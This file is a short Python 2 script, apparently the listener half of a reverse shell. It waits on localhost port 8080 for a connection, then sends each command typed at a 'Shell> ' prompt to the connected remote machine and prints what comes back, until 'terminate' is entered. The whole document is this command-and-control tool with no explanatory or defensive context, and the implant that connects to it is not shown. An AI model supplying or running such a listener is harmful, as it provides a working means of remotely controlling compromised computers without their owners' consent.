import socket # for building TCP connection

def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(("localhost", 8080))
	s.listen(1)
	conn, addr = s.accept()
	print '[+] We got a connection from: ', addr
	
	while True:
		command = raw_input("Shell> ")
		
		if 'terminate' in command:
			conn.send('terminate')
			conn.close() # close the connection with remote host
			break
		
		else:
			conn.send(command) # send command
			print conn.recv(4096)
			
def main():
	connect()
	
main()
